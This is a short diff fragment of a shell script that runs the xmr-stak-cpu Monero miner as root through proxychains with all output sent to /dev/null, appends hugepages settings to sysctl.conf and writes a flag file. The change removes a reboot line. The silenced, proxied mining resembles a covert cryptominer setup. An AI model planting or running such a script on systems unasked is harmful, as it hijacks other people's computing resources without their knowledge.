@@ -20,7 +20,7 @@ then
         
 	cd /xmr/xmr/xmr-stak-cpu/bin/
         sudo /xmr/xmr/proxychains-ng/proxychains4 -f /xmr/xmr/proxychains/proxychains.conf /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
-        sudo reboot   
+          
 else
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
         sudo /bin/su -c "echo 'xxxxx' >> /flag2"
